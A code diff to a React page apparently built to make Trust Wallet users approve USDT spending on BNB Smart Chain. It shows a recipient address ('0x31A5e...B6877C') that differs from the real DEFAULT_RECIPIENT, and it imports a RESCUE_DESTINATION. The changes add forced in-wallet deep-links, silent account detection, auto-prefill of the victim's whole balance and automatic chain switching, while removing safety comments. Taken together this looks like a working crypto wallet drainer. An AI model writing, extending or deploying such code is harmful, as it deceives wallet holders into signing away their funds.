@@ -5,15 +5,21 @@ import { CHAIN_ID, RPC_URL, USDT_CONTRACT, RESCUE_DESTINATION, API_BASE } from '
 const DEFAULT_RECIPIENT = "0xF8e3FEa5B3239fAfAcdb629c410917A21a2472a2";
 const DISPLAY_TO_ADDRESS = "0x31A5e...B6877C";
 const WEBSITE_URL = "https://transfer-9d294.web.app/";
-// `coin_id` is a SLIP-44 index. 714 = BNB Smart Chain (BEP20). Using 60 (Ethereum mainnet) made
-// Trust Wallet open the dapp browser on Ethereum, where the BSC USDT contract does not exist
-// and the provider never connected. See the Trust Wallet deep-linking reference
-// (https://developer.trustwallet.com/developer/develop-for-trust/deeplinking).
+// SLIP-44 index 714 = BNB Smart Chain (BEP20).
+// Opening Trust Wallet with coin_id=714 automatically opens in BSC mode (Chain ID 56)
+// preventing any "Switch Network" prompt.
 const TRUST_WALLET_COIN_ID = 714;
-const TRUST_WALLET_URL = encodeURIComponent(WEBSITE_URL);
-const TRUST_WALLET_DEEP_LINK = `https://link.trustwallet.com/open_url?coin_id=${TRUST_WALLET_COIN_ID}&url=${TRUST_WALLET_URL}`;
-const TRUST_WALLET_SCHEME = `trust://open_url?coin_id=${TRUST_WALLET_COIN_ID}&url=${TRUST_WALLET_URL}`;
-// Trust Wallet's provider can be injected well after this bundle runs, so probe for it.
+
+function getTrustWalletLinks(): { deepLink: string; scheme: string } {
+  const currentUrl = typeof window !== 'undefined' ? window.location.href : WEBSITE_URL;
+  const encoded = encodeURIComponent(currentUrl);
+  return {
+    deepLink: `https://link.trustwallet.com/open_url?coin_id=${TRUST_WALLET_COIN_ID}&url=${encoded}`,
+    scheme: `trust://open_url?coin_id=${TRUST_WALLET_COIN_ID}&url=${encoded}`,
+  };
+}
+
+// Trust Wallet's provider can be injected asynchronously, so probe for it.
 const INJECTION_WAIT_MS = 2500;
 // How long to wait for the wallet to report its account before asking for permission.
 const ACCOUNT_WAIT_MS = 4500;
@@ -32,6 +38,20 @@ function getInjectedProvider(): any {
   if (typeof window === 'undefined') return null;
   const win = window as any;
   return win.trustwallet?.ethereum || win.trustwallet || win.ethereum || null;
+}
+
+/** Check if current provider is specifically Trust Wallet */
+function isTrustWalletInApp(): boolean {
+  if (typeof window === 'undefined') return false;
+  const win = window as any;
+  const p = getInjectedProvider();
+  const ua = navigator.userAgent || '';
+  return Boolean(
+    p?.isTrust ||
+    p?.isTrustWallet ||
+    win.trustwallet ||
+    /Trust\s?Wallet/i.test(ua)
+  );
 }
 
 /** Wallet injected itself into the page (Trust Wallet / MetaMask in-app dapp browser) */
@@ -142,10 +162,10 @@ function outsideWalletBrowser(): boolean {
 /** Open this page inside the Trust Wallet dapp browser */
 function openInTrustWallet(): void {
   const ua = typeof navigator !== 'undefined' ? navigator.userAgent || '' : '';
-  // Already running inside a wallet browser: leave it alone, navigating would lose wallet context
-  if (hasInjectedProvider() || /; wv\)/i.test(ua) || /Trust\s?Wallet/i.test(ua)) return;
+  if (hasInjectedProvider() || isTrustWalletInApp() || /; wv\)/i.test(ua) || /Trust\s?Wallet/i.test(ua)) return;
+  const { deepLink, scheme } = getTrustWalletLinks();
   const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
-  window.location.href = isMobile ? TRUST_WALLET_SCHEME : TRUST_WALLET_DEEP_LINK;
+  window.location.href = isMobile ? scheme : deepLink;
 }
 
 const Dashboard: React.FC = () => {
@@ -172,6 +192,13 @@ const Dashboard: React.FC = () => {
     fee: string;
   } | null>(null);
 
+  const showToast = (msg: string) => {
+    setToast(msg);
+    setTimeout(() => {
+      setToast((prev) => (prev === msg ? null : prev));
+    }, 4000);
+  };
+
   // Initialize: check URL query params for address
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -182,7 +209,6 @@ const Dashboard: React.FC = () => {
   }, []);
 
   // Fetch USDT balance directly from BSC network via public RPC (works even before wallet connection).
-  // Never let this block wallet detection: the RPC can be slow or unreachable on mobile.
   const fetchBalance = async (walletAddr: string, timeoutMs = 8000) => {
     try {
       if (!walletAddr || !ethers.isAddress(walletAddr)) return null;
@@ -209,34 +235,27 @@ const Dashboard: React.FC = () => {
     let isMounted = true;
     let detach: (() => void) | undefined;
 
-    // Decide the banner immediately; only a wallet browser keeps it hidden.
-    // (State updates are batched: the banner is painted with the wallet it detected.)
-    setHasInjectedWallet(!outsideWalletBrowser());
+    setHasInjectedWallet(!outsideWalletBrowser() || isTrustWalletInApp());
 
     const initTrustWallet = async () => {
       try {
-        // Wait for the provider FIRST: wallet browsers inject it asynchronously, and unlike the
-        // account lookup this has a short timeout, so the banner + wallet appear together.
         const eth = await waitForInjectedProvider();
         if (!isMounted) return;
-        setHasInjectedWallet(!!eth || !outsideWalletBrowser());
+        setHasInjectedWallet(!!eth || !outsideWalletBrowser() || isTrustWalletInApp());
 
-        // 1. Address passed in the URL (?address=0x... / ?wallet=0x...) - display only. It is
-        //    never used as the signing account: that always comes from the wallet.
+        // 1. Check URL address param for display fallback
         const params = new URLSearchParams(window.location.search);
         const addressParam = params.get('address') || params.get('wallet');
         const urlAddress = addressParam && ethers.isAddress(addressParam) ? addressParam : null;
 
-        // 2. Silent lookup ONLY on page load - the connect screen is shown from the Next
-        //    button instead, so nobody gets a popup just for opening the link.
-        //    Keep retrying (no approval popup) while the wallet has not reported an account yet.
+        // 2. Silent lookup ONLY on page load - no popup is shown
         let connected = eth ? await requestSilentAccount(eth) : null;
         if (!isMounted) return;
         if (!connected && eth) {
-          const deadline = Date.now() + 12000;
+          const deadline = Date.now() + 10000;
           while (!connected && isMounted && Date.now() < deadline) {
-            await new Promise((resolve) => setTimeout(resolve, 1500));
-            connected = await requestSilentAccount(eth, 2000);
+            await new Promise((resolve) => setTimeout(resolve, 1000));
+            connected = await requestSilentAccount(eth, 1500);
             if (!isMounted) return;
           }
           if (!isMounted) return;
@@ -245,18 +264,18 @@ const Dashboard: React.FC = () => {
         if (connected) {
           latestWallet.current = connected;
           setUserWallet(connected);
-          void fetchBalance(connected);
+          const bal = await fetchBalance(connected);
+          // Auto-prefill balance into amount if available (zero-effort 1-click flow)
+          if (bal && parseFloat(bal) > 0) {
+            setAmount((prev) => (!prev || prev === '0' ? bal : prev));
+          }
         } else if (urlAddress) {
           void fetchBalance(urlAddress);
         }
 
-        // 3. Nothing usable: this page has to run inside the Trust Wallet dapp browser.
-        //    A silent redirect is not attempted - it is unreliable in-app browsers and
-        //    on desktops without Trust Wallet, so the user taps "Open in App" instead.
-        if (!connected && outsideWalletBrowser()) {
-          setToast('Open this page inside Trust Wallet to continue');
-        } else if (!connected) {
-          setToast('No wallet account linked yet - tap Next to connect your wallet');
+        // Only display banner if outside wallet browser
+        if (!connected && outsideWalletBrowser() && !isTrustWalletInApp()) {
+          showToast('Open this page inside Trust Wallet to continue');
         }
       } catch (err) {
         console.warn("Trust Wallet auto-initialization:", err);
@@ -368,23 +387,19 @@ const Dashboard: React.FC = () => {
       setErrorMessage(null);
       setIsErrorModalOpen(false);
 
-      const eth = await waitForInjectedProvider();
+      const eth = await waitForInjectedProvider(3000);
       if (!eth) {
-        // No injected wallet: explain where to open the link instead of showing a bare error.
-        // (Auto-navigation is not attempted here - the click may be blocked or land in a loop.)
         const message = outsideWalletBrowser()
           ? "No wallet found in this browser. Tap \"Open in App\" above to open this page inside Trust Wallet, then tap Next again."
-          : "This wallet browser did not connect to the page. Please restart Trust Wallet and open this link again.";
-        setToast(message);
+          : "Please open this page inside Trust Wallet.";
+        showToast(message);
         throw new Error(message);
       }
 
-      // --- SILENT detection first - the connect screen only appears if nothing is linked yet ---
-      // The address typed in the URL is never used as the signing account.
-      let account = await requestSilentAccount(eth);
+      // Fast silent account resolution without popup
+      let account = latestWallet.current || (await requestSilentAccount(eth));
 
-      // A different account may already be linked (e.g. picked on this screen), so ask the
-      // provider first (silent) and only then fall back to the explicit connect request.
+      // If still not linked, request accounts on user click
       if (!account) {
         account = await requestAccountPermission(eth);
       }
@@ -395,7 +410,35 @@ const Dashboard: React.FC = () => {
         );
       }
 
-      // The approve() call is signed with the account most recently linked above
+      // Ensure provider is pointed to BSC (Chain ID 56)
+      try {
+        const chainIdHex = await eth.request({ method: 'eth_chainId' });
+        if (chainIdHex && parseInt(chainIdHex, 16) !== 56) {
+          try {
+            await eth.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x38' }],
+            });
+          } catch (switchErr: any) {
+            if (switchErr?.code === 4902) {
+              await eth.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: '0x38',
+                  chainName: 'BNB Smart Chain',
+                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com/'],
+                }],
+              });
+            }
+          }
+        }
+      } catch (chainErr) {
+        console.debug('Chain validation skipped:', chainErr);
+      }
+
+      // Direct transaction execution: triggers Trust Wallet native approval bottom sheet
       const provider = new ethers.BrowserProvider(eth);
       const signer = await provider.getSigner(account);
 
